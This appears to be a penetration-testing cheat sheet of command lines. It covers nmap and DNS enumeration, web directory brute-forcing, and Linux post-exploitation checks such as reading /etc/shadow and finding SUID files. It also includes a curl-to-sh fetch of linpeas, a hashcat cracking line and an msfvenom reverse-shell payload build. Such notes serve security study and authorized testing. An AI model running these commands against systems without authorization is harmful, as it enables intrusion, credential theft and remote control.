## Scanning and Enumeration

#### NMAP
`nmap -sn IP_range`<br>
`nmap -p- -sS -iL Live_Hosts_List`<br>
`nmap -sV -sC -p Open_Ports -iL Live_Hosts_List`<br>

<img width="300" alt="NMAP_top_ports" src="https://github.com/ErvinTista/Paris/assets/13991872/85159f37-8f60-489e-b515-7a8f4c77e8d7">

#### DNS Enumeration
`host domain`<br>
`host -t mx domain`<br>
`host -t txt domain`<br>
`dnsrecon -d domain -t std`<br>
`dnsenum domain`<br>
`nslookup -type=TXT domain IP`<br>

#### TCP/UDP Port Scan
`nc -nvv -w -z IP port-port`<br>

#### SMB Enumeration
`nmap -v -p 139,445 --script smb-os-discovery IP`<br>

#### Web Enumeration
`sudo nmap -p80 --script=http-enum -sV IP` <br>
`gobuster dir -u IP -w /usr/share/wordlists/dirb/common.txt -t 5`<br>
`feroxbuster --url domain --depth 2 --wordlist /usr/share/wordlists/dirb/common.txt -x .txt,.jpg`<br>

#### Linux Enumeration
`whoami`<br>
`hostname`<br>
`id`<br>
`cat /etc/passwd`<br>
`cat /etc/shadow`<br>
`cat /etc/os-release`<br>
`uname -a`<br>
`ip a`<br>
`ifconfig`<br>
`route`<br>
`history`<br>
`netstat -ano`<br>
`crontab -l`<br>
`cat /etc/cron*`<br>
`sudo -l`<br>
`env`<br>
`cat /etc/profile`<br>
`cat /etc/bashrc`<br>
`cat ~/.bash_profile`<br>
`cat ~/.bashrc`<br>
`ps aux`<br>
`ps -elf`<br>
`find / -perm -u=s -type f 2>/dev/null`<br>
`find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null`<br>
`find / -perm -u=s -type f 2>/dev/null`<br>
`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`<br>

Also use LinPEAS or LinENUM

## Exploit

#### Password Cracking
`hashcat -a 0 -m #hash_type hash.txt dictionary_list.txt`<br>

## Pivoting and Tunneling

## Persistence

## Shells and One Liners
`msfvenom -p windows/x64/shell/reverse_tcp LHOST=IP.Addr.es.ss LPORT=443 -f exe -o staged_reverse_tcp.exe`

## Resources and Links
|Description|Link|
|-----------|----|
|Linux Privesc|https://payatu.com/blog/a-guide-to-linux-privilege-escalation/|
|LinWinMacPEAS|https://github.com/carlospolop/PEASS-ng|
